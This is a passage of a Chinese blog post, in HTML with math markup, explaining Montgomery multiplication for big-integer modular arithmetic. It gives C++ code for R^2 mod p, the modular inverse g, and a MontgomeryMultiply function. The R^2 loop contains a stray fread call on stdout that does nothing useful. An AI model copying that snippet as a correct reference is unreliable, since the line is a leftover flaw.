class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint64_t</span> borrow = <span class=\"number\">2</span>, diff;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">32</span>; ++i) &#123;</span><br><span class=\"line\">  diff = p_2[i] - borrow;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(p_2[i] &lt; borrow)&#123;</span><br><span class=\"line\">    borrow = <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    borrow = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  p_2[i] = diff;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> buffer[<span class=\"number\">33</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">buffer[<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; (N &lt;&lt; <span class=\"number\">7</span>); ++i)&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">32</span>; j &gt; <span class=\"number\">0</span>; --j) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(buffer, <span class=\"built_in\">sizeof</span>(<span class=\"type\">uint8_t</span>), <span class=\"number\">1</span>, stdout);</span><br><span class=\"line\">    buffer[j] = (buffer[j] &lt;&lt; <span class=\"number\">1</span>) | (buffer[j - <span class=\"number\">1</span>] &gt;&gt; <span class=\"number\">63</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  buffer[<span class=\"number\">0</span>] = buffer[<span class=\"number\">0</span>] &lt;&lt; <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"type\">bool</span> flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">31</span>; j &gt;= <span class=\"number\">0</span>; --j) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(buffer[j] &gt; p[j]) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (buffer[j] &lt; p[j]) &#123;</span><br><span class=\"line\">        flag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(buffer[<span class=\"number\">32</span>] != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(flag)&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> borrow = <span class=\"number\">0</span>, diff;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">32</span>; ++j) &#123;</span><br><span class=\"line\">      diff = buffer[j] - p[j] - borrow;</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(buffer[j] &lt; p[j] || buffer[j] &lt; borrow)&#123;</span><br><span class=\"line\">        borrow = <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        borrow = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      buffer[j] = diff;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(borrow) buffer[<span class=\"number\">32</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(R2modp, buffer, <span class=\"number\">256</span>);</span><br></pre></td></tr></table></figure></p>\n<p>上述过程其实就是从 1 开始，循环执行 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>N</mi><mo>&lt;</mo><mo>&lt;</mo><mn>7</mn><mo>=</mo><mo stretchy=\"false\">(</mo><mi>N</mi><mo>⋅</mo><mn>64</mn><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">N&lt;&lt;7=(N\\cdot64)^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72243em;vertical-align:-0.0391em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">7</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.064108em;vertical-align:-0.25em;\"></span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span> 次：</p>\n<ol>\n<li>乘 2，通过左移 1 位实现</li>\n<li>检查是否大于 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span>，大于则减去 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi></mrow><annotation encoding=\"application/x-tex\">P</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span></span></span></span></li>\n</ol>\n<p>这样得到最后的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>R</mi><mn>2</mn></msup><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">R^2\\bmod p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span> 结果。</p>\n<h3 id=\"p_0-1bmod-w\"><a class=\"anchor\" href=\"#p_0-1bmod-w\">#</a> <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>p</mi><mn>0</mn><mrow><mo>−</mo><mn>1</mn></mrow></msubsup><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">p_0^{-1}\\bmod W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.120547em;vertical-align:-0.266308em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.854239em;\"><span style=\"top:-2.433692em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span><span style=\"top:-3.1031310000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.266308em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span></h3>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi></mrow><annotation encoding=\"application/x-tex\">g</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span></span></span></span> 有一个比较技巧性的计算方法如下：(<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 就是模 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span>)</p>\n<p><img data-src=\"https://s2.loli.net/2024/12/17/SDpqrb7BlOXPjhd.png\" alt=\"\" /></p>\n<p>所以我对它的实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">g = p[<span class=\"number\">0</span>];</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; ++i)&#123;</span><br><span class=\"line\">    g = g * (<span class=\"number\">2</span> - p[<span class=\"number\">0</span>] * g);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">g = -g;</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(p_2, p, <span class=\"number\">256</span>);</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"montgomery-multiplication\"><a class=\"anchor\" href=\"#montgomery-multiplication\">#</a> Montgomery Multiplication</h2>\n<p>Montgomery Multiplication 是 Montgomery 变换域上的乘法，比在 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span> 有限域上更适合计算机运算，将其记为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>⊙</mo></mrow><annotation encoding=\"application/x-tex\">\\odot</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord\">⊙</span></span></span></span>，其效果就是：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>a</mi><mo>⊙</mo><mi>b</mi><mo>=</mo><mfrac><mrow><mi>a</mi><mi>b</mi></mrow><mi>R</mi></mfrac><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">a\\odot b=\\frac{ab}{R}\\bmod p\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊙</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.05744em;vertical-align:-0.686em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.37144em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">b</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.686em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span></span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVhcnNzbC5vcmcvYmlnaW50Lmh0bWw=\">BearSSL</span> 给出的伪代码如下：(<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 就是模 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span>)</p>\n<p><img data-src=\"/assets/math/cryptography/rsa/2.png\" alt=\"\" width=\"67%\" /></p>\n<p>我的实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">Int <span class=\"title\">MontgomeryMultiply</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">uint64_t</span> * b)</span> <span class=\"type\">const</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">auto</span> add2z = [](<span class=\"type\">uint64_t</span> * z, <span class=\"type\">uint64_t</span> &amp;b, <span class=\"type\">int</span> i)&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> carry = b, sum;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (; i &lt; <span class=\"number\">3</span>; ++i) &#123;</span><br><span class=\"line\">      sum = z[i] + carry;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (sum &lt; carry || sum &lt; z[i]) &#123;</span><br><span class=\"line\">        carry = <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        carry = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      z[i] = sum;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"function\">Int <span class=\"title\">d</span><span class=\"params\">(F)</span></span>;</span><br><span class=\"line\">  <span class=\"type\">uint64_t</span> d_h[<span class=\"number\">2</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; F.N; ++i)&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> f = (d.a[<span class=\"number\">0</span>] + a[i] * b[<span class=\"number\">0</span>]) * F.g;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> c[<span class=\"number\">2</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; F.N; ++j)&#123;</span><br><span class=\"line\">      <span class=\"type\">uint64_t</span> z[<span class=\"number\">3</span>]= &#123;c[<span class=\"number\">0</span>], c[<span class=\"number\">1</span>], <span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">      <span class=\"type\">__uint128_t</span> ai = <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">__uint128_t</span>&gt;(a[i]);</span><br><span class=\"line\">      <span class=\"type\">__uint128_t</span> bj = <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">__uint128_t</span>&gt;(b[j]);</span><br><span class=\"line\">      <span class=\"type\">__uint128_t</span> aibj = ai * bj;</span><br><span class=\"line\">      <span class=\"type\">uint64_t</span> aibj_l = <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">uint64_t</span>&gt;(aibj);</span><br><span class=\"line\">      <span class=\"type\">uint64_t</span> aibj_h = <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">uint64_t</span>&gt;(aibj &gt;&gt; <span class=\"number\">64</span>);</span><br><span class=\"line\">      <span class=\"type\">__uint128_t</span> f_ = <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">__uint128_t</span>&gt;(f);</span><br><span class=\"line\">      <span class=\"type\">__uint128_t</span> mj = <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">__uint128_t</span>&gt;(F.p[j]);</span><br><span class=\"line\">      <span class=\"type\">__uint128_t</span> f_mj = f_ * mj;</span><br><span class=\"line\">      <span class=\"type\">uint64_t</span> f_mj_l = <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">uint64_t</span>&gt;(f_mj);</span><br><span class=\"line\">      <span class=\"type\">uint64_t</span> f_mj_h = <span class=\"built_in\">static_cast</span>&lt;<span class=\"type\">uint64_t</span>&gt;(f_mj &gt;&gt; <span class=\"number\">64</span>);</span><br><span class=\"line\">      <span class=\"built_in\">add2z</span>(z, aibj_l, <span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"built_in\">add2z</span>(z, aibj_h, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"built_in\">add2z</span>(z, f_mj_l, <span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"built_in\">add2z</span>(z, f_mj_h, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"built_in\">add2z</span>(z, d.a[j], <span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(j &gt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        d.a[j - <span class=\"number\">1</span>] = z[<span class=\"number\">0</span>];</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      c[<span class=\"number\">0</span>] = z[<span class=\"number\">1</span>];</span><br><span class=\"line\">      c[<span class=\"number\">1</span>] = z[<span class=\"number\">2</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> z[<span class=\"number\">3</span>]= &#123;d_h[<span class=\"number\">0</span>], d_h[<span class=\"number\">1</span>], <span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"built_in\">add2z</span>(z, c[<span class=\"number\">0</span>], <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">add2z</span>(z, c[<span class=\"number\">1</span>], <span class=\"number\">1</span>);</span><br><span class=\"line\">    d.a[F.N - <span class=\"number\">1</span>] = z[<span class=\"number\">0</span>];</span><br><span class=\"line\">    d_h[<span class=\"number\">0</span>] = z[<span class=\"number\">1</span>];</span><br><span class=\"line\">    d_h[<span class=\"number\">1</span>] = z[<span class=\"number\">2</span>];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"type\">bool</span> flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">31</span>; i &gt;= <span class=\"number\">0</span>; --i) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (d.a[i] &gt; F.p[i]) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (d.a[i] &lt; F.p[i]) &#123;</span><br><span class=\"line\">      flag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(d_h[<span class=\"number\">0</span>] != <span class=\"number\">0</span>) flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(flag)&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> borrow = <span class=\"number\">0</span>, diff;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; F.N; ++j) &#123;</span><br><span class=\"line\">      diff = d.a[j] - F.p[j] - borrow;</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(d.a[j] &lt; F.p[j] + borrow)&#123;</span><br><span class=\"line\">        borrow = <span class=\"number\">1</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        borrow = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      d.a[j] = diff;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> d;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"模乘\"><a class=\"anchor\" href=\"#模乘\">#</a> 模乘</h2>\n<p>在有了上述准备后，有限域 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span> 上的模乘 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>⊗</mo></mrow><annotation encoding=\"application/x-tex\">\\otimes</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span 